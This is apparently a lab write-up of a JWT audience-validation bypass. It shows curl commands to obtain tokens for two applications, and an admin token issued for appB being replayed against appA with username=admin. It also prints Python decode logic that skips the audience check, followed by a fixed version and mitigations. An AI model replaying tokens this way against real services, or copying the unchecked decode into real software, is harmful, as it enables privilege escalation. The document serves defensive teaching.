# JWT Audience Claim Validation Bypass and Cross-Service Relay Attack

## Overview

In this project, I conducted a security assessment against a centralized JWT authentication architecture supporting multiple applications. The objective was to determine whether improper validation of the JWT `aud` (audience) claim could allow a token issued for one application to be reused against another application.

During testing, I identified a Cross-Service Relay vulnerability caused by missing audience claim validation. This misconfiguration allowed a JWT containing administrative privileges for one application to be accepted by another application, resulting in unauthorized privilege escalation across service boundaries.

---

## Objectives

* Analyze JWT audience (`aud`) claim implementation.
* Enumerate authorization controls across multiple applications.
* Verify audience claim enforcement mechanisms.
* Test for cross-service JWT replay vulnerabilities.
* Demonstrate privilege escalation through authorization boundary failures.
* Document security impacts and mitigation strategies.

---

## Lab Environment

| Component           | Details                     |
| ------------------- | --------------------------- |
| Environment         | Controlled API Security Lab |
| Authentication      | JSON Web Token (JWT)        |
| Signing Algorithm   | HS256                       |
| Tools Used          | cURL, JWT.io                |
| Target Applications | appA, appB                  |
| Attack Technique    | Cross-Service Relay Attack  |

---

## Methodology

The assessment followed these phases:

1. Authenticate against multiple applications sharing the same identity provider.
2. Enumerate and analyze JWT claims.
3. Validate application-specific authorization behavior.
4. Test audience claim enforcement.
5. Replay JWTs across service boundaries.
6. Verify privilege escalation opportunities.
7. Identify root causes and remediation controls.

---

## Initial Authentication

### Authenticating to Application A

I first authenticated to Application A and obtained a JWT intended for the `appA` audience.

```bash
curl -H "Content-Type: application/json" \
-X POST \
-d '{ "username":"user","password":"password7","application":"appA"}' \
http://10.130.143.79/api/v1.0/example7
```

Response:

```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
}
```

---

### Authenticating to Application B

Next, I authenticated to Application B.

```bash
curl -H "Content-Type: application/json" \
-X POST \
-d '{ "username":"user","password":"password7","application":"appB"}' \
http://10.130.143.79/api/v1.0/example7
```

Response:

```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
}
```

---

## JWT Analysis

Using JWT.io, I decoded both tokens to inspect their claims.

### Application A Token

```json
{
  "username": "user",
  "admin": 0,
  "aud": "appA"
}
```

Observations:

* User-level privileges.
* Audience restricted to `appA`.

### Application B Token

```json
{
  "username": "user",
  "admin": 1,
  "aud": "appB"
}
```

Observations:

* Administrative privileges enabled.
* Audience restricted to `appB`.

The differing authorization levels suggested a possible cross-service authorization bypass if audience validation was not enforced.

---

## Audience Validation Testing

I tested both tokens against their intended applications.

### Application A

The Application A token was accepted and correctly identified the user as a standard user.

### Application B

The Application B token was accepted and granted administrative privileges.

This confirmed that the same user possessed different authorization levels depending on the application context.

---

## Cross-Service Relay Attack

To determine whether Application A validated the audience claim, I replayed the administrative JWT issued for Application B against Application A.

```bash
curl -H "Authorization: Bearer <APP_B_ADMIN_TOKEN>" \
http://TARGET/api/v1.0/example7_appA?username=admin
```

The request was accepted successfully.

This demonstrated that:

* JWT signature validation was performed.
* Audience claim validation was not enforced.
* Application A trusted authorization claims originating from Application B.
* Privilege escalation across application boundaries was possible.

---

## Evidence

### JWT Issued for Application A

```json
{
  "username": "user",
  "admin": 0,
  "aud": "appA"
}
```

### JWT Issued for Application B

```json
{
  "username": "user",
  "admin": 1,
  "aud": "appB"
}
```

### Vulnerable JWT Validation Logic

```python
payload = jwt.decode(
    token,
    self.secret,
    algorithms="HS256"
)
```

The application verified the JWT signature but failed to validate the intended audience.

---

## Security Findings

| Finding                         | Severity |
| ------------------------------- | -------- |
| Missing JWT Audience Validation | High     |
| Cross-Service Token Replay      | High     |
| Authorization Boundary Failure  | Critical |
| Privilege Escalation            | Critical |

---

## Security Impact

Improper audience validation can lead to:

* Cross-application privilege escalation.
* Unauthorized administrative access.
* Authentication trust boundary violations.
* Token replay attacks across services.
* Lateral movement opportunities.
* Increased attack surface in centralized authentication environments.

---

## Mitigation

Applications should explicitly validate the JWT audience claim during token verification.

### Secure Implementation

```python
payload = jwt.decode(
    token,
    self.secret,
    audience=["appA"],
    algorithms=["HS256"]
)
```

Additional recommendations include:

* Enforce strict audience validation.
* Implement application-specific authorization scopes.
* Separate trust boundaries between services.
* Apply least-privilege principles.
* Conduct regular JWT security assessments.
* Monitor cross-service authentication events.

---

## Key Takeaways

* JWT signature validation alone is insufficient.
* Audience claim enforcement is a critical security control.
* Centralized authentication systems introduce trust boundary risks.
* Cross-service relay attacks can result in severe privilege escalation.
* Authorization scopes must always be explicitly validated.

---

## Disclaimer

This project was conducted in an authorized laboratory environment for educational and defensive cybersecurity research purposes. All testing activities were performed against intentionally vulnerable systems within a controlled environment.
